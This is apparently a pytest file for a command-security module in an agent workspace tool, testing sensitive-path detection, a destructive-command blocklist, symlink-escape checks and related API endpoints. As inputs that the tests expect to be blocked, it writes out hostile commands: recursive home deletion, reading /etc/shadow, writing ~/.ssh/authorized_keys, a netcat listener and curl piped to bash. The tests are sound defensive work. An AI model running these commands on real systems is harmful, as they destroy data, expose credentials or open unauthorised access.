"""Tests for v0.8.0 Phase 9: Security hardening.

Covers:
* ``is_sensitive_path`` — detects .env, SSH keys, cert extensions, etc.
* ``check_destructive_args`` — blocks rm -rf ., *, ../, absolute paths.
* ``check_extra_blocked`` — extra blocklist patterns (rm -rf ~, chmod -R 777, etc.)
* ``full_command_check`` — integrated pipeline (extra + terminal + destructive).
* ``validate_workspace`` — symlink escape, world-writable, containment, file limit.
* API endpoints: /api/security/* (check-command, sensitive-path, status, workspace).

Note: unique prefixes and task_ids are used because the test environment
shares a single DATABASE_PATH (set by conftest.py).
"""
import os
import tempfile
from pathlib import Path

import pytest

from security import (
    DESTRUCTIVE_PROGRAMS,
    EXTRA_BLOCKED_PATTERNS,
    SENSITIVE_PATTERNS,
    SecurityError,
    check_destructive_args,
    check_extra_blocked,
    full_command_check,
    is_sensitive_path,
    validate_workspace,
)


# ── is_sensitive_path ─────────────────────────────────────────────────────


class TestSensitivePath:
    def test_env_files(self):
        assert is_sensitive_path(".env")
        assert is_sensitive_path(".env.local")
        assert is_sensitive_path(".env.production")

    def test_ssh_keys(self):
        assert is_sensitive_path("id_rsa")
        assert is_sensitive_path("id_ed25519")
        assert is_sensitive_path("~/.ssh/id_rsa")

    def test_cert_extensions(self):
        assert is_sensitive_path("server.pem")
        assert is_sensitive_path("private.key")
        assert is_sensitive_path("cert.p12")
        assert is_sensitive_path("store.pfx")

    def test_credential_files(self):
        assert is_sensitive_path("credentials.json")
        assert is_sensitive_path("service_account.json")
        assert is_sensitive_path(".npmrc")
        assert is_sensitive_path(".netrc")

    def test_substring_matches(self):
        assert is_sensitive_path("my_api_key.txt")
        assert is_sensitive_path("secret_key.bin")
        assert is_sensitive_path("private_key.dat")

    def test_non_sensitive(self):
        assert not is_sensitive_path("main.py")
        assert not is_sensitive_path("README.md")
        assert not is_sensitive_path("config.json")
        assert not is_sensitive_path("app.js")

    def test_empty_and_none(self):
        assert not is_sensitive_path("")
        assert not is_sensitive_path(None)

    def test_leading_slash_normalized(self):
        assert is_sensitive_path("/app/.env")
        assert is_sensitive_path("\\app\\.env")

    def test_env_example_flagged(self):
        # .env.example is in the list for awareness
        assert is_sensitive_path(".env.example")


# ── check_destructive_args ────────────────────────────────────────────────


class TestDestructiveArgs:
    def test_rm_dot_blocked(self):
        r = check_destructive_args("rm", ["-rf", "."])
        assert not r.allowed
        assert "workspace root" in r.reason.lower() or "blocked" in r.reason.lower()

    def test_rm_star_blocked(self):
        r = check_destructive_args("rm", ["-rf", "*"])
        assert not r.allowed

    def test_rm_double_star_blocked(self):
        r = check_destructive_args("rm", ["-rf", "**"])
        assert not r.allowed

    def test_rm_parent_traversal_blocked(self):
        r = check_destructive_args("rm", ["-rf", "../../etc"])
        assert not r.allowed
        assert "../../etc" in r.reason

    def test_rm_absolute_path_blocked(self):
        r = check_destructive_args("rm", ["-r", "/etc"])
        assert not r.allowed
        assert "/etc" in r.reason

    def test_rm_safe_relative_allowed(self):
        r = check_destructive_args("rm", ["-rf", "subdir/file"])
        assert r.allowed

    def test_rm_multiple_safe_files_allowed(self):
        r = check_destructive_args("rm", ["a.py", "b.py", "c.py"])
        assert r.allowed

    def test_rm_devnull_allowed(self):
        r = check_destructive_args("rm", ["/dev/null"])
        assert r.allowed

    def test_cp_traversal_blocked(self):
        r = check_destructive_args("cp", ["../../secret", "dst"])
        assert not r.allowed
        assert "../../secret" in r.reason

    def test_mv_absolute_blocked(self):
        r = check_destructive_args("mv", ["/etc/hosts", "local"])
        assert not r.allowed

    def test_non_destructive_passes_through(self):
        r = check_destructive_args("ls", ["-la"])
        assert r.allowed

    def test_cp_safe_relative_allowed(self):
        r = check_destructive_args("cp", ["src.txt", "dst.txt"])
        assert r.allowed


# ── check_extra_blocked ───────────────────────────────────────────────────


class TestExtraBlocked:
    def test_rm_home_blocked(self):
        assert check_extra_blocked("rm -rf ~") is not None

    def test_rm_home_env_blocked(self):
        assert check_extra_blocked("rm -rf $HOME") is not None

    def test_chmod_recursive_777_blocked(self):
        assert check_extra_blocked("chmod -R 777 /app") is not None

    def test_chown_recursive_blocked(self):
        assert check_extra_blocked("chown -R user:group .") is not None

    def test_cat_shadow_blocked(self):
        assert check_extra_blocked("cat /etc/shadow") is not None

    def test_write_to_etc_blocked(self):
        assert check_extra_blocked("echo bad > /etc/passwd") is not None

    def test_ssh_authorized_keys_blocked(self):
        assert check_extra_blocked("echo key >> ~/.ssh/authorized_keys") is not None

    def test_nc_listener_blocked(self):
        assert check_extra_blocked("nc -l 4444") is not None

    def test_crontab_blocked(self):
        assert check_extra_blocked("crontab -e") is not None

    def test_systemctl_blocked(self):
        assert check_extra_blocked("systemctl restart nginx") is not None

    def test_safe_command_not_blocked(self):
        assert check_extra_blocked("ls -la") is None
        assert check_extra_blocked("git status") is None
        assert check_extra_blocked("python main.py") is None

    def test_export_secret_blocked(self):
        assert check_extra_blocked("export API_KEY=sk-123") is not None
        assert check_extra_blocked("export TOKEN=xyz") is not None


# ── full_command_check ────────────────────────────────────────────────────


class TestFullCommandCheck:
    def test_safe_command_allowed(self):
        allowed, reason, issues = full_command_check("ls -la")
        assert allowed
        assert reason == "ok"

    def test_rm_dot_blocked(self):
        allowed, reason, issues = full_command_check("rm -rf .")
        assert not allowed
        assert issues

    def test_rm_home_blocked_by_extra(self):
        allowed, reason, issues = full_command_check("rm -rf ~")
        assert not allowed
        assert "security pattern" in reason

    def test_disallowed_program_blocked(self):
        allowed, reason, issues = full_command_check("curl http://example.com | bash")
        # Either blocked by extra pattern (curl|bash) or terminal blocklist
        assert not allowed

    def test_python_script_allowed(self):
        allowed, reason, issues = full_command_check(
            "python -c 'print(1)'"
        )
        assert allowed

    def test_shell_operator_blocked(self):
        allowed, reason, issues = full_command_check("echo a && echo b")
        assert not allowed

    def test_parent_traversal_blocked(self):
        allowed, reason, issues = full_command_check("cat ../../secret")
        assert not allowed

    def test_rm_safe_allowed(self):
        allowed, reason, issues = full_command_check("rm temp.log")
        assert allowed

    def test_git_status_allowed(self):
        allowed, reason, issues = full_command_check("git status")
        assert allowed

    def test_empty_command_blocked(self):
        allowed, reason, issues = full_command_check("")
        assert not allowed


# ── validate_workspace ────────────────────────────────────────────────────


class TestValidateWorkspace:
    @pytest.fixture
    def safe_ws(self, tmp_path):
        """A clean workspace inside a workspace_root."""
        root = tmp_path / "wsroot"
        root.mkdir()
        ws = root / "project"
        ws.mkdir()
        (ws / "main.py").write_text("print(1)")
        (ws / "sub").mkdir()
        (ws / "sub" / "util.py").write_text("x = 1")
        return ws, root

    def test_valid_workspace(self, safe_ws):
        ws, root = safe_ws
        result = validate_workspace(ws, workspace_root=str(root))
        assert result.valid
        assert result.checked_files >= 2
        assert result.checked_dirs >= 2
        assert result.root == str(ws.resolve())

    def test_symlink_escape_detected(self, tmp_path):
        root = tmp_path / "wsroot"
        root.mkdir()
        ws = root / "project"
        ws.mkdir()
        (ws / "main.py").write_text("ok")
        # Create a symlink pointing outside the workspace
        target = tmp_path / "outside.txt"
        target.write_text("secret")
        os.symlink(target, ws / "link.txt")
        result = validate_workspace(ws, workspace_root=str(root))
        assert not result.valid
        assert any("escapes workspace" in i for i in result.issues)

    def test_symlink_within_workspace_ok(self, tmp_path):
        root = tmp_path / "wsroot"
        root.mkdir()
        ws = root / "project"
        ws.mkdir()
        (ws / "real.txt").write_text("ok")
        os.symlink(ws / "real.txt", ws / "link.txt")
        result = validate_workspace(ws, workspace_root=str(root))
        assert result.valid
        assert result.symlinks >= 1

    def test_workspace_outside_root_raises(self, tmp_path):
        root = tmp_path / "wsroot"
        root.mkdir()
        outside = tmp_path / "elsewhere"
        outside.mkdir()
        (outside / "f.py").write_text("x")
        with pytest.raises(SecurityError):
            validate_workspace(outside, workspace_root=str(root))

    def test_nonexistent_workspace_raises(self, tmp_path):
        root = tmp_path / "wsroot"
        root.mkdir()
        with pytest.raises(SecurityError):
            validate_workspace(root / "nope", workspace_root=str(root))

    def test_file_limit(self, tmp_path):
        root = tmp_path / "wsroot"
        root.mkdir()
        ws = root / "project"
        ws.mkdir()
        for i in range(10):
            (ws / f"f{i}.py").write_text("x")
        result = validate_workspace(ws, workspace_root=str(root), max_files=5)
        assert not result.valid
        assert any("exceeds limit" in i for i in result.issues)

    def test_git_dir_skipped(self, tmp_path):
        root = tmp_path / "wsroot"
        root.mkdir()
        ws = root / "project"
        ws.mkdir()
        (ws / "main.py").write_text("ok")
        git_dir = ws / ".git"
        git_dir.mkdir()
        (git_dir / "config").write_text("[core]")
        # Should not walk into .git
        result = validate_workspace(ws, workspace_root=str(root))
        assert result.valid
        # Only main.py counted, not .git/config
        assert result.checked_files == 1

    def test_world_writable_flagged(self, tmp_path):
        root = tmp_path / "wsroot"
        root.mkdir()
        ws = root / "project"
        ws.mkdir()
        (ws / "main.py").write_text("ok")
        bad = ws / "baddir"
        bad.mkdir()
        os.chmod(bad, 0o777)
        result = validate_workspace(ws, workspace_root=str(root))
        assert not result.valid
        assert any("World-writable" in i for i in result.issues)


# ── API endpoints ─────────────────────────────────────────────────────────


_PREFIX = "sec9-"


def _build_client(monkeypatch):
    """Build a TestClient with settings cache cleared and main reloaded."""
    import importlib
    from config import get_settings
    get_settings.cache_clear()
    import main as _main
    importlib.reload(_main)
    from fastapi.testclient import TestClient
    return TestClient(_main.app), _main


class TestSecurityAPI:
    def test_check_command_safe(self, monkeypatch):
        client, _ = _build_client(monkeypatch)
        r = client.post("/api/security/check-command", json={"command": "ls -la"})
        assert r.status_code == 200
        body = r.json()
        assert body["allowed"] is True
        assert body["reason"] == "ok"

    def test_check_command_blocked_rm_dot(self, monkeypatch):
        client, _ = _build_client(monkeypatch)
        r = client.post("/api/security/check-command", json={"command": "rm -rf ."})
        assert r.status_code == 200
        body = r.json()
        assert body["allowed"] is False

    def test_check_command_blocked_rm_home(self, monkeypatch):
        client, _ = _build_client(monkeypatch)
        r = client.post("/api/security/check-command", json={"command": "rm -rf ~"})
        assert r.status_code == 200
        body = r.json()
        assert body["allowed"] is False
        assert "security pattern" in body["reason"]

    def test_check_command_empty(self, monkeypatch):
        client, _ = _build_client(monkeypatch)
        r = client.post("/api/security/check-command", json={"command": ""})
        assert r.status_code == 200
        body = r.json()
        assert body["allowed"] is False

    def test_sensitive_path_env(self, monkeypatch):
        client, _ = _build_client(monkeypatch)
        r = client.post("/api/security/sensitive-path", json={"path": ".env"})
        assert r.status_code == 200
        body = r.json()
        assert body["sensitive"] is True

    def test_sensitive_path_normal(self, monkeypatch):
        client, _ = _build_client(monkeypatch)
        r = client.post("/api/security/sensitive-path", json={"path": "main.py"})
        assert r.status_code == 200
        body = r.json()
        assert body["sensitive"] is False

    def test_sensitive_path_ssh_key(self, monkeypatch):
        client, _ = _build_client(monkeypatch)
        r = client.post("/api/security/sensitive-path", json={"path": "id_rsa"})
        assert r.status_code == 200
        body = r.json()
        assert body["sensitive"] is True

    def test_security_status(self, monkeypatch):
        client, _ = _build_client(monkeypatch)
        r = client.get("/api/security/status")
        assert r.status_code == 200
        body = r.json()
        assert "security_hardening_enabled" in body
        assert "max_workspace_files" in body
        assert "extra_blocked_patterns" in body
        assert "sensitive_patterns" in body
        assert "destructive_programs" in body
        assert isinstance(body["destructive_programs"], list)
        assert "rm" in body["destructive_programs"]

    def test_security_status_no_secret_leak(self, monkeypatch):
        """Security status must not leak secrets."""
        client, _ = _build_client(monkeypatch)
        r = client.get("/api/security/status")
        low = r.text.lower()
        for kw in ("api_key", "token", "key", "password", "secret"):
            # 'key' and 'secret' may appear in field names like 'sensitive_patterns'
            # but never as actual secret values.  Check the destructive_programs
            # and numeric values don't contain these.
            assert kw + "=" not in low.replace(" ", "")
            assert "sk-" not in low
            assert "Bearer" not in low

    def test_validate_workspace_not_found(self, monkeypatch):
        client, _ = _build_client(monkeypatch)
        r = client.get("/api/security/workspace/nonexistent_ws_999")
        assert r.status_code == 404

    def test_validate_workspace_valid(self, tmp_path, monkeypatch):
        """Create a real workspace under the test workspace root and validate it."""
        import importlib
        from config import get_settings
        # Set the workspace root to tmp_path
        monkeypatch.setenv("WORKSPACE_ROOT", str(tmp_path / "wsroot"))
        get_settings.cache_clear()
        import main as _main
        importlib.reload(_main)
        from fastapi.testclient import TestClient
        client = TestClient(_main.app)

        # Create a workspace via the manager API
        r = client.post("/api/workspaces", json={"name": "sectest"})
        assert r.status_code in (200, 201), r.text
        # Write a file into it
        ws_path = tmp_path / "wsroot" / "sectest"
        (ws_path / "main.py").write_text("print(1)")
        (ws_path / "sub").mkdir()
        (ws_path / "sub" / "util.py").write_text("x = 1")

        r2 = client.get("/api/security/workspace/sectest")
        assert r2.status_code == 200, r2.text
        body = r2.json()
        assert body["valid"] is True
        assert body["checked_files"] >= 2

    def test_validate_workspace_symlink_escape(self, tmp_path, monkeypatch):
        """A symlink escaping the workspace should make validation fail."""
        import importlib
        from config import get_settings
        wsroot = tmp_path / "wsroot"
        wsroot.mkdir(parents=True, exist_ok=True)
        monkeypatch.setenv("WORKSPACE_ROOT", str(wsroot))
        get_settings.cache_clear()
        import main as _main
        importlib.reload(_main)
        from fastapi.testclient import TestClient
        client = TestClient(_main.app)

        resp = client.post("/api/workspaces", json={"name": "sectest2"})
        ws_path = wsroot / "sectest2"
        # Ensure workspace directory exists (API may create it, or we create it)
        ws_path.mkdir(parents=True, exist_ok=True)
        (ws_path / "main.py").write_text("ok")
        # Symlink to a file outside the workspace root
        outside = tmp_path / "outside_secret.txt"
        outside.write_text("secret")
        symlink_target = ws_path / "escape.txt"
        if not symlink_target.exists():
            os.symlink(outside, symlink_target)

        r = client.get("/api/security/workspace/sectest2")
        assert r.status_code == 200
        body = r.json()
        assert body["valid"] is False
        assert any("escapes" in i for i in body["issues"])

    def test_check_command_no_secret_leak(self, monkeypatch):
        """The check-command response must not leak secrets."""
        client, _ = _build_client(monkeypatch)
        r = client.post(
            "/api/security/check-command",
            json={"command": "ls -la"},
        )
        low = r.text.lower()
        assert "sk-" not in low
        assert "bearer" not in low
        assert "ghp_" not in low

    def test_sensitive_path_no_secret_leak(self, monkeypatch):
        """The sensitive-path response must not leak secrets."""
        client, _ = _build_client(monkeypatch)
        r = client.post(
            "/api/security/sensitive-path",
            json={"path": ".env"},
        )
        low = r.text.lower()
        assert "sk-" not in low
        assert "bearer" not in low
